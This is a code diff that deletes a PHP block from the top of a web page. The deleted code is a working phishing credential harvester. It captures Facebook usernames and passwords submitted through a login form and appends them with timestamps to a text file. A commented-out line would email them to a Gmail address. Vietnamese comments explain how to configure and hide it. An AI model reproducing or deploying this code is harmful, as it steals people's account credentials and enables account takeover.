@@ -1,29 +1,3 @@
-<?php
-  session_start();
-     date_default_timezone_set('Asia/Ho_Chi_Minh');
-
- $huongdz['num'] = 0;
-	if(isset($_SESSION['huongdz'])) {
-		$huongdz = $_SESSION['huongdz'];
-	}
-	if($huongdz['num'] == 5){ //đăt số lần đăng nhập cho phép
-	    die('<script>alert("Spam cdmm")</script>') ; //thông báo sau khi đăng nhập quá số lần cho phép
-	}
-   if(isset($_POST["taikhoan"])){
-       $time = date('H:i:s d/m/Y');
-         $username = $_POST["taikhoan"];
-     $password = $_POST["matkhau"];
-      $headers = "Tài khoản - Facebook";
-    $subject = "code by Hướng";
-      $body = "Time: ".$time."|acc: ".$username."|pass: ".$password."\n"; //định dạng acc|pass
-  //  mail("jaxuatt6@gmail.com", $headers, $body, $subject);  // muốn gửi mail thì để dòng mail này 
-     $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
-     fwrite($test,$body);
-     fclose($test);
-     	$huongdz['num']++;
-$_SESSION['huongdz'] = $huongdz;
-   }
-?> 
  <!DOCTYPE html>
         <html>
  
